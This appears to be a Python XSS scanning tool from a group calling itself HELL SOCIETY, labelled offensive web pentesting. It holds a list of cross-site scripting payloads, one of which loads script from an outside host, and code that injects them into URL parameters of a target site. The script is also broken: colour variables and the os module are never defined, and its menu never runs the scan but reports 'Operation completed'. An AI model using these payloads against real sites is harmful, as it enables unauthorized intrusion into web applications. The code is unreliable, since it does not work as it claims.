#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  XSS VULNERABILITY SCANNER v2.0                                  ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - Web Pentesting                            ║
╚══════════════════════════════════════════════════════════════════╝

ADVERTENCIA LEGAL: El uso de esta herramienta sin autorización
escrita del propietario del sistema objetivo es ILEGAL.
Los creadores NO se hacen responsables del mal uso de esta herramienta.
"""

import requests
import sys
import time
import colorama
from colorama import Fore, Back, Style
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
import argparse
import re

colorama.init(autoreset=True)

BANNER = f"""⠉⠉⠉⠉⠁⠀⠀⠀⠀⠒⠂⠰⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠻⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠠⠀⠐⠒⠒⠀⠀⠈⠉⠉⠉⠉⢉⣉⣉⣉⣙⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡀⠤⠒⠒⠉⠁⠀⠀⠀⠀⠳⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠛⠛⠉⠛⠛⠶⢦⣤⡐⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⢳⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡤⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠳⠶⢶⣦⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠉⠑⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄
  {Y}  Created by: HELL SOCIETY{RS}"""

DISCLAIMER = f"""
{Fore.RED}{Back.BLACK}
[!] ADVERTENCIA LEGAL [!]
Esta herramienta es para uso en pentesting AUTORIZADO únicamente.
Los creadores (HELL SOCIETY) NO se hacen responsables del mal uso.
"""

REFLECTED_PAYLOADS = [
    '<script>alert(1)</script>',
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=alert("XSS")>',
    '<svg/onload=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<input onfocus=alert("XSS") autofocus>',
    '<a href="javascript:alert(1)">click</a>',
    '<a href="javascript:alert(\'XSS\')">click</a>',
    '<iframe src="javascript:alert(1)">',
    "'\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "'\"><svg/onload=alert(1)>",
    "\"><script>alert('XSS')</script>",
    "';alert(1);//",
    "')alert(1);//",
    '");alert("XSS");//',
    '"><img src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<math><mtext><table><mglyph><svg><mtext><script>alert(1)</script>',
    '<body onresize=alert(1)>',
    '<form><input type="submit" formaction="javascript:alert(1)">',
    '<select onchange=alert(1)><option>1',
    '<keygen onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<isindex type=image src=1 onerror=alert(1)>',
    '<script src="//xss.rocks"></script>',
    '<div onmouseover=alert(1)>test</div>',
    '<div style="background:url(javascript:alert(1))">',
]

STORED_CHECKS = [
    '<script>alert("Stored XSS")</script>',
    '<img src=x onerror=alert("Stored")>',
    '<svg/onload=alert("Stored XSS")>',
]

class XSSScanner:
    def __init__(self, target, timeout=10):
        self.target = target
        self.timeout = timeout
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) HellSociety/2.0'
        })

    def get_params(self):
        parsed = urlparse(self.target)
        return parse_qs(parsed.query)

    def modify_url(self, param, payload):
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                          parsed.params, new_query, parsed.fragment))

    def test_reflected(self, param, payload):
        try:
            test_url = self.modify_url(param, payload)
            response = self.session.get(test_url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            page_text = str(soup)

            patterns = [
                re.escape(payload),
                re.escape(payload.replace('<', '&lt;')),
                re.escape(payload.replace('<', '&lt;').replace('>', '&gt;')),
            ]

            for pattern in patterns:
                if re.search(pattern, page_text, re.IGNORECASE):
                    return True

            if payload in response.text:
                return True

        except Exception as e:
            print(f"{Fore.YELLOW}  [!] Error: {e}")
        return False

    def scan_reflected(self):
        params = self.get_params()
        if not params:
            print(f"{Fore.RED}  [!] No parameters found in URL")
            return

        total = len(params) * len(REFLECTED_PAYLOADS)
        current = 0

        print(f"{Fore.CYAN}  [*] Scanning {len(params)} parameter(s) with {len(REFLECTED_PAYLOADS)} payloads")
        print(f"{Fore.CYAN}  [*] Total tests: {total}\n")

        for param in params:
            for payload in REFLECTED_PAYLOADS:
                current += 1
                progress = (current / total) * 100
                bar_length = 40
                filled = int(bar_length * current / total)
                bar = f"{Fore.GREEN}█{Style.RESET_ALL}" * filled + f"{Fore.RED}░{Style.RESET_ALL}" * (bar_length - filled)
                print(f"\r{Fore.CYAN}  [{bar}] {progress:.1f}% - Testing: {param}", end="", flush=True)

                if self.test_reflected(param, payload):
                    result = {
                        'param': param,
                        'payload': payload,
                        'type': 'Reflected XSS'
                    }
                    self.results.append(result)
                    print(f"\n")
                    print(f"{Fore.GREEN}  [+] VULNERABLE! - Parameter: {Fore.WHITE}{param}")
                    print(f"{Fore.GREEN}  [+] Payload: {Fore.YELLOW}{payload}")
                    print(f"{Fore.GREEN}  [+] Type: {Fore.MAGENTA}Reflected XSS")
                    print(f"{Fore.CYAN}  {'─' * 60}")

    def print_results(self):
        if not self.results:
            print(f"\n{Fore.YELLOW}  [!] No XSS vulnerabilities found")
            return

        print(f"\n{Fore.RED}{Back.BLACK}  SCAN COMPLETE - {len(self.results)} XSS VULNERABILITY(IES) FOUND  ")
        print(f"{Fore.CYAN}  {'═' * 60}")

        for i, r in enumerate(self.results, 1):
            print(f"\n{Fore.CYAN}  [{i}] {Fore.WHITE}Parameter: {r['param']}")
            print(f"      {Fore.YELLOW}Payload: {r['payload']}")
            print(f"      {Fore.GREEN}Type: {r['type']}")
            print(f"{Fore.CYAN}  {'─' * 60}")



def ask_retry():
    print()
    print(f"  {Y}{'='*50}{RS}")
    print(f"  {C}[1] {BW}Usar esta herramienta de nuevo{RS}")
    print(f"  {C}[2] {BW}Volver al panel principal{RS}")
    print(f"  {R}[0] {BW}Salir{RS}")
    print(f"  {Y}{'='*50}{RS}")
    try:
        ch = input(f"  {G}root@hellsociety{C}~{RS}# ").strip()
        if ch == '1':
            return 'retry'
        elif ch in ['2', '0']:
            return 'exit'
        else:
            return 'retry'
    except (EOFError, KeyboardInterrupt):
        return 'exit'

def main():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(BANNER)
    print()
    print(f"  {BW}{Style.BRIGHT}  XSS SCANNER{RS}")
    print(f"  {Y}{Style.BRIGHT}  HELL SOCIETY Community{RS}")
    print()
    while True:
        print(f"  {G}╔╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╗{RS}")
        print(f"  {G}╟  {BW}XSS SCANNER                             {RS}  {G}╟{RS}")
        print(f"  {G}╚╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╝{RS}")
        print()
        print(f"  {C}[1]  {BW}Target URL                                   {RS}")
        print(f"  {C}[2]  {BW}Request timeout                              {RS}")
        print()
        print(f"  {C}[3]  {BW}Ejecutar con todos los argumentos{RS}")
        print()
        print(f"  {R}[0]  {BW}Exit{RS}")
        print()
        try:
            choice = input(f"  {G}root@hellsociety{C}~{RS}# ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n  {R}[*] Goodbye...{RS}")
            sys.exit(0)
        print()
        if choice == '1':
            print(f"  {Y}[*] Target URL{RS}")
            value = input(f"  {Y}[*] -u: {RS}").strip()
            print(f"  {C}[*] Executing with -u={BW}{value}{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        if choice == '2':
            print(f"  {Y}[*] Request timeout{RS}")
            value = input(f"  {Y}[*] -t: {RS}").strip()
            print(f"  {C}[*] Executing with -t={BW}{value}{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        elif choice == '3':
            print(f"  {Y}[*] Executing with all default parameters{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        elif choice == '0':
            print(f"  {Y}[*] Goodbye from Hell Society...{RS}")
            sys.exit(0)
        else:
            print(f"  {R}[!] Invalid option. Choose 0-3.{RS}")
        ch = ask_retry()
        if ch == 'exit':
            sys.exit(0)
        else:
            os.system('clear' if os.name != 'nt' else 'cls')
            print(BANNER)
            print()

if __name__ == "__main__":
    main()

